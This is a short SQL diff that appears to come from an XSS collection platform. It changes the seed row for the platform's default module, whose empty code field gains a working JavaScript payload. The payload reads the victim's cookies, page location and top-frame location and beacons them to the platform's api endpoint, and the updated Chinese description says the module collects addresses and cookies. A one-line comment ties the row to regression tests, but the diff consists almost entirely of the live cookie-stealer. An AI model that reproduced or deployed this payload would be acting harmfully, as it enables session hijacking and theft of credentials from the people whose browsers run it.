@@ -16,4 +16,4 @@ VALUES (90,90,'{"opener":"","toplocation":"http:\\/\\/example.com","cookie":"abc
 
 -- Legacy default module referenced by receiver regression tests.
 INSERT IGNORE INTO oc_module (id,userId,title,`keys`,setkeys,code,`level`,isOpen,description,isAudit,managerId,managerName,addTime)
-VALUES (1,1,'默认模块','["location","toplocation","cookie","opener"]','["keepsession"]','',0,1,'基础收包模块',1,1,'blue',1341846542);
+VALUES (1,1,'默认模块','["location","toplocation","cookie","opener"]','["keepsession"]','(function(){var i=new Image();i.src=&quot;/index.php?do=api&amp;id={projectId}&amp;location=&quot;+escape(document.location.href)+&quot;&amp;toplocation=&quot;+escape(top.location.href)+&quot;&amp;cookie=&quot;+escape(document.cookie);})();',0,1,'基础收包模块，收集地址与 Cookie',1,1,'blue',1341846542);
